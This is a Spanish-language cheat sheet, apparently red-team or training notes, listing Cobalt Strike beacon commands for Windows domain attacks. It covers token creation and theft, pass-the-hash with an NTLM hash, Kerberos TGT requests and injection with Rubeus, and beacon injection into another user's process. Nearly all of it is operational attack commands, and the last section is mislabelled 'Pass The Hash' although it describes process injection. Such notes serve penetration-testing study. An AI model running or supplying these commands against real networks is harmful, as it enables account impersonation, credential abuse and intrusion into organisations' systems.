### 🛠️ 1. **Make Token (usando contraseña)**

> Si lo usas **sin** contraseña es solo para que a nivel de red parezcas ese usuario, como por ejemplo hacer pass the ticket necesitas tambien parecer ese usuario a nivel red.

```powershell
beacon> make_token CONTOSO\rsteel Passw0rd!

beacon> rev2self
```

### 🕵️ 2. **Steal Token (desde proceso de otro usuario)**

>**Se roba un token activo** de un proceso ya iniciado por otra cuenta.
> **Requiere integridad alta** (ADMIN/SYSTEM).

```powershell
beacon> ps

beacon> steal_token ID

beacon> rev2self
```

###  3. **Pass The Hash**

```powershell
beacon> pth CONTOSO\rsteel fc525c9683e8fe067095ba2ddc971889
```

###  4. **Pass The Ticket**

### 🎫 **Solicitud de TGTs**

- Si tienes el **hash NTLM** o clave AES de un usuario, puedes pedir su TGT legítimamente.
- ⚠️ El uso de hash NTLM devuelve tickets RC4 → no recomendado.
- ✅ Preferible usar clave **AES256** (más segura).

```powershell
beacon> execute-assembly C:\Tools\Rubeus.exe asktgt /user:rsteel /domain:CONTOSO.COM /aes256:<clave> /nowrap
```

🧪 **Inyección de TGTs en sesiones**


```powershell
beacon> make_token CONTOSO\rsteel FakePass

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\notepad.exe /username:rsteel /domain:CONTOSO.COM /password:FakePass /ticket:[TGT]

beacon> steal_token PID
```

4. Para eliminar tickets:

```powershell
beacon> kerberos_ticket_purge
beacon> rev2self
```


###  5. **Pass The Hash**

> Listamos procesos con  *ps* y si vemos un proceso que ejecuta otro usuario inyectamos el beacon.

```powershell
beacon> ps #**process_browser** si quieres con interfaz

beacon> inject ID x64 http
```
